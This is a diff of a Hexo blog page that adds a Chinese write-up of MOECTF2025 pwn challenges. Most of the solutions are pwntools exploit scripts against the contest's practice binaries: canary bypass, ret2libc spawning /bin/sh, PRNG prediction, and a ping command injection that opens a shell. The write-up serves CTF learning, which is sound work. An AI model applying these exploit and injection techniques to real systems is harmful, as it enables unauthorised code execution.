@@ -77,7 +77,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/"/>
+    <link rel="canonical" href="http://example.com/2026/01/26/moectf2025复现中/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -86,13 +86,15 @@
     
         
         <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MOECTF2025复现中">
+<meta property="og:url" content="http://example.com/2026/01/26/MOECTF2025%E5%A4%8D%E7%8E%B0%E4%B8%AD/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-01-26T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-01-26T10:10:14.262Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
@@ -107,7 +109,7 @@
     
     <title>
         
-            sadsnowcat&#39;s blog - Documenting My PWN Learning Journey
+            MOECTF2025复现中 | sadsnowcat&#39;s blog
         
     </title>
 
@@ -185,155 +187,17 @@
 <main class="page-container" id="swup">
 
 	
-	
-    <style>
-        .home-banner-container {
-            background: none !important;
-        }
-        .home-article-item,
-        .sidebar-links,
-        .sidebar-content,
-        a.page-number,
-        a.extend,
-        .sidebar-links .links:hover,
-        .right-bottom-tools,
-        footer.footer {
-            background-color: var(--background-color-transparent-80) !important;
-        }
-        .right-bottom-tools:hover,
-        a.page-number:hover,
-        a.extend:hover {
-            background-color: var(--primary-color) !important;
-        }
-        .site-info,
-        .home-article-sticky-label {
-            background-color: var(--background-color-transparent-15) !important;
-        }
-        .home-article-sticky-label {
-            backdrop-filter: none !important;
-        }
-    </style>
-    <div class="home-banner-background transition-fade fixed top-0 left-0 w-screen h-screen scale-125 sm:scale-110 box-border will-change-transform bg-cover">
-        <img src="/images/wallhaven-wqery6-light.webp" alt="home-banner-background" class="w-full h-full object-cover dark:hidden">
-        <img src="/images/wallhaven-wqery6-dark.webp" alt="home-banner-background" class="w-full h-full object-cover hidden dark:block">
-    </div>
-
-
-<div class="home-banner-container flex justify-center items-center transition-fade relative">
-    
-    <div class="content mt-8 flex flex-col justify-center items-center transition-fade-down">
-        <div class="description flex flex-col justify-center items-center w-screen font-medium text-center"
-        
-        >
-            Sadsnowcat
-            
-            
-                <p><i id="subtitle"></i></p>
-            
-        </div>
-        
-    </div>
-    <script>
-        const scrollToMain = ()=> {
-            console.log('scroll');
-            const target = document.querySelector('.main-content-container');
-            target.scrollIntoView({ behavior: 'smooth'});
-        }
-
-        // QR code mobile interaction handling
-        document.addEventListener('DOMContentLoaded', function() {
-            const qrToggleItems = document.querySelectorAll('.qr-toggle-item');
-            let activeQrItem = null;
-
-            // Handle QR code toggle for mobile
-            qrToggleItems.forEach(item => {
-                const trigger = item.querySelector('.qr-trigger');
-                const popup = item.querySelector('.qr-popup');
-
-                // Add click event for mobile
-                trigger.addEventListener('click', function(e) {
-                    e.preventDefault();
-                    
-                    // Close any other open QR codes
-                    qrToggleItems.forEach(otherItem => {
-                        if (otherItem !== item) {
-                            otherItem.classList.remove('qr-active');
-                        }
-                    });
-
-                    // Toggle current QR code
-                    const isActive = item.classList.contains('qr-active');
-                    if (isActive) {
-                        item.classList.remove('qr-active');
-                        activeQrItem = null;
-                    } else {
-                        item.classList.add('qr-active');
-                        activeQrItem = item;
-                    }
-                });
-
-                // Remove focus styles on blur for mobile
-                trigger.addEventListener('blur', function() {
-                    // Small delay to allow for potential click events
-                    setTimeout(() => {
-                        if (activeQrItem !== item) {
-                            item.classList.remove('qr-active');
-                        }
-                    }, 100);
-                });
-            });
-
-            // Close QR codes when clicking outside
-            document.addEventListener('click', function(e) {
-                const isQrElement = e.target.closest('.qr-toggle-item');
-                if (!isQrElement && activeQrItem) {
-                    activeQrItem.classList.remove('qr-active');
-                    activeQrItem = null;
-                }
-            });
-        });
-    </script>
-    <style>
-        /* Mobile-specific QR code styles */
-        .qr-toggle-item.qr-active .qr-popup {
-            visibility: visible !important;
-            opacity: 1 !important;
-            transform: translateY(0) !important;
-        }
-        
-        /* Prevent button from staying in focus/hover state on mobile */
-        @media (hover: none) and (pointer: coarse) {
-            .qr-toggle-item:focus,
-            .qr-toggle-item:hover {
-                background-color: transparent;
-            }
-            
-            .qr-toggle-item .qr-trigger:focus,
-            .qr-toggle-item .qr-trigger:hover {
-                background-color: transparent;
-                color: inherit;
-            }
-            
-            /* Only show active state when explicitly toggled */
-            .qr-popup {
-                visibility: hidden !important;
-                opacity: 0 !important;
-            }
-        }
-    </style>
-</div>
-	
 
 	<div class="main-content-container flex flex-col justify-between min-h-dvh">
 		<div class="main-content-header">
 			<header class="navbar-container px-6 md:px-12">
-    <div class="navbar-content transition-navbar has-home-banner">
+    <div class="navbar-content transition-navbar ">
         <div class="left">
             
             <a class="logo-title" href="/">
-                <h1>
+                
                 sadsnowcat&#39;s blog
-                </h1>
+                
             </a>
         </div>
 
@@ -347,7 +211,7 @@
 
                             <li class="navbar-item">
                                 <!-- Menu -->
-                                <a class="active"
+                                <a class=""
                                    href="/"
                                         >
                                     <i class="fa-regular fa-house fa-fw"></i>
@@ -432,7 +296,7 @@
 
                     <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                         
-                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                            href="/"
                         >
                             <span>
@@ -537,143 +401,218 @@
 
 		<div class="main-content-body transition-fade-up">
 			
-			<div class="home-sidebar-container">
-    <div class="sticky-container sticky">
-        
-        
-            
-            <div class="sidebar-content" >
-                <div class="avatar flex justify-center">
-    <img src="/images/redefine-avatar.svg">
-</div>
-                <div class="author flex flex-col justify-center my-2.5 mx-0">
-    <div class="name">sadsnowcat</div>
-    
-        <div class="label">Lv1</div>
-    
-</div>
-                <div class="statistics flex justify-around my-2.5">
-    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
-        <div class="label text-third-text-color text-sm">Tags</div>
-    </a>
-    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
-        <div class="label text-third-text-color text-sm">Categories</div>
-    </a>
-    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
-        <div class="label text-third-text-color text-sm">Posts</div>
-    </a>
-</div>
-            </div>
-        
-
-    </div>
-</div>
-
-			
 
 			<div class="main-content">
-				<div class="home-content-container">
-    <ul class="home-article-list">
-        
-            <li class="home-article-item">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
 
-                
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">MOECTF2025复现中</h1>
+			</div>
+			
+		</div>
 
-                
-
-                
-                <div class="flex flex-col gap-5 px-7 pb-7 pt-7">
-                    <h3 class="home-article-title">
-                        <a href="/2026/01/26/MOECTF2025%E5%A4%8D%E7%8E%B0%E4%B8%AD/">
-                            MOECTF2025复现中
-                        </a>
-                    </h3>
-
-                    <div class="home-article-content markdown-body">
-                        
-                            
-                            欢迎来到MOECTF2025！
-boom人工canary，提供了win函数，提示可以使用python的ctypes包
-ctypes可以调用C库函数，于是使用ctypes加载libc
-init()中有v0 = time(0LL)，使time&#x3D;0，
-char s[124]; // [rsp+0h] [rbp-90h] BYREF
-int v5; // [rsp+7Ch] [rbp-14...
-                        
-                    </div>
-
-                    <div class="home-article-meta-info-container">
-    <div class="home-article-meta-info">
-        <span><i class="fa-solid fa-calendars"></i>&nbsp;
-            <span class="home-article-date" data-date="Mon Jan 26 2026 12:00:00 GMT+0800">
-                
-                    2026-01-26
-                
-            </span>
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/redefine-avatar.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">sadsnowcat</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-01-26 12:00</span>
+        <span class="mobile">2026-01-26 12:00</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-01-26 18:10:14</span>
+            <span class="mobile">2026-01-26 18:10:14</span>
+            <span class="hover-info">Updated</span>
         </span>
-        
-        
-    </div>
+    
 
-    <a href="/2026/01/26/MOECTF2025%E5%A4%8D%E7%8E%B0%E4%B8%AD/">Read more<span class="seo-reader-text">MOECTF2025复现中</span>&nbsp;<i class="fa-solid fa-angle-right"></i></a>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
 </div>
 
-                </div>
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p><strong>欢迎来到MOECTF2025！</strong></p>
+<h2 id="boom"><a href="#boom" class="headerlink" title="boom"></a>boom</h2><p>人工canary，提供了win函数，提示可以使用python的ctypes包</p>
+<p>ctypes可以调用C库函数，于是使用ctypes加载libc</p>
+<p>init()中有<code>v0 = time(0LL)</code>，使time&#x3D;0，</p>
+<p><code>char s[124]; // [rsp+0h] [rbp-90h] BYREF</code></p>
+<p><code>int v5; // [rsp+7Ch] [rbp-14h]</code></p>
+<p><code>int v6; // [rsp+8Ch] [rbp-4h]</code></p>
+<p>先填充0x90-0x14，再填充canary，再填充16+8</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;192.168.50.1&#x27;</span>, <span class="number">58472</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">libc.srand(<span class="built_in">int</span>(time.time()))</span><br><span class="line">canary = libc.rand() % <span class="number">114514</span></span><br><span class="line">backdoor = <span class="number">0x401276</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;(y/n)&#x27;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">124</span> + p32(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(ret)+ p64(backdoor)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Enter your message: &#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="boom-revenge"><a href="#boom-revenge" class="headerlink" title="boom_revenge"></a>boom_revenge</h2><p>同上（为什么重复几次才成功？）🤔</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">p = remote(<span class="string">&#x27;192.168.50.1&#x27;</span>, <span class="number">62171</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">libc.srand(<span class="built_in">int</span>(time.time()))</span><br><span class="line">canary = libc.rand() % <span class="number">114514</span></span><br><span class="line">backdoor = <span class="number">0x401276</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;(y/n)&#x27;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">124</span> + p32(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(ret)+ p64(backdoor)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Enter your message: &#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="inject"><a href="#inject" class="headerlink" title="inject"></a>inject</h2><p>这是Rust写的吗</p>
+<p>使用#注释<code>-c 4</code></p>
+<p>或第一个sh执行第二个sh <code>ping sh -c sh -c 4</code></p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;192.168.50.1&#x27;</span>, <span class="number">52971</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#payload = &quot;\nsh -c sh&quot;</span></span><br><span class="line"><span class="comment">#payload=&quot;\nsh #&quot;</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;Enter host to ping: &#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="ezlibc"><a href="#ezlibc" class="headerlink" title="ezlibc"></a>ezlibc</h2><p>开启了PIE，显然可以通过read泄露PIE基址，这里注意一下延迟绑定，还需要泄露libc，于是返回泄露libc</p>
+<p>现在你掌握ret2libc了</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;192.168.50.1&quot;</span>,<span class="number">65064</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;use &quot;</span>)</span><br><span class="line">leak_read=<span class="built_in">int</span>((p.recv(<span class="number">14</span>)),<span class="number">16</span>)</span><br><span class="line">pie_base=leak_read-<span class="number">0x1060</span></span><br><span class="line">start=pie_base+<span class="number">0x10c0</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;A&quot;</span>*<span class="number">40</span>+p64(start)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;use &quot;</span>)</span><br><span class="line">leak_read2 = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">libc_base=leak_read2-libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rdi=libc_base+<span class="number">0x2a3e5</span></span><br><span class="line">ret=pie_base+<span class="number">0x101a</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">40</span>+p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(system)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="randomlock"><a href="#randomlock" class="headerlink" title="randomlock"></a>randomlock</h2><p>猜测seed是1</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;192.168.50.1&#x27;</span>,<span class="number">62581</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    r = libc.rand() % <span class="number">10000</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(r).encode())</span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="number">9</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvall())</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="str-check"><a href="#str-check" class="headerlink" title="str_check"></a>str_check</h2><p>使用\x00截断字符串，字符串前4是moew，填充后门</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;192.168.50.1&#x27;</span>,<span class="number">53500</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">backdoor=<span class="number">0x40123b</span></span><br><span class="line">payload=<span class="string">b&#x27;meow\x00&#x27;</span>.ljust(<span class="number">0x20</span>+<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(backdoor)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;say?&#x27;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="string">b&#x27;200&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="syslock"><a href="#syslock" class="headerlink" title="syslock"></a>syslock</h2><p>to be continued</p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> MOECTF2025复现中</li>
+        <li><strong>Author:</strong> sadsnowcat</li>
+        <li><strong>Created at
+                :</strong> 2026-01-26 12:00:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-01-26 18:10:14
             </li>
         
-            <li class="home-article-item">
+        <li>
+            <strong>Link:</strong> https://sadsnowcat.github.io/2026/01/26/MOECTF2025复现中/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
 
-                
-
-                
-
-                
-                <div class="flex flex-col gap-5 px-7 pb-7 pt-7">
-                    <h3 class="home-article-title">
-                        <a href="/2026/01/16/hello-world/">
-                            Hello World
-                        </a>
-                    </h3>
-
-                    <div class="home-article-content markdown-body">
-                        
-                            
-                            Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
-Qu...
-                        
-                    </div>
-
-                    <div class="home-article-meta-info-container">
-    <div class="home-article-meta-info">
-        <span><i class="fa-solid fa-calendars"></i>&nbsp;
-            <span class="home-article-date" data-date="Fri Jan 16 2026 19:39:58 GMT+0800">
-                
-                    2026-01-16
-                
-            </span>
-        </span>
-        
-        
-    </div>
-
-    <a href="/2026/01/16/hello-world/">Read more<span class="seo-reader-text">Hello World</span>&nbsp;<i class="fa-solid fa-angle-right"></i></a>
-</div>
-
-                </div>
-            </li>
-        
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
     </ul>
-
-    <div class="home-paginator px-7 py-5">
-        <div class="paginator">
-	<span class="page-number current">1</span>
 </div>
-  
+
+		</div>
+		
+
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/01/16/hello-world/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Hello World</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
     </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.js';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+                    lang: 'zh-CN',
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
 </div>
 
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">MOECTF2025复现中</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#boom"><span class="nav-text">boom</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#boom-revenge"><span class="nav-text">boom_revenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#inject"><span class="nav-text">inject</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezlibc"><span class="nav-text">ezlibc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#randomlock"><span class="nav-text">randomlock</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#str-check"><span class="nav-text">str_check</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#syslock"><span class="nav-text">syslock</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
 			</div>
 
 			
@@ -751,6 +690,26 @@ Qu...
 		</div>
 	</div>
 
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
 	
 
 	<div class="right-side-tools-container">
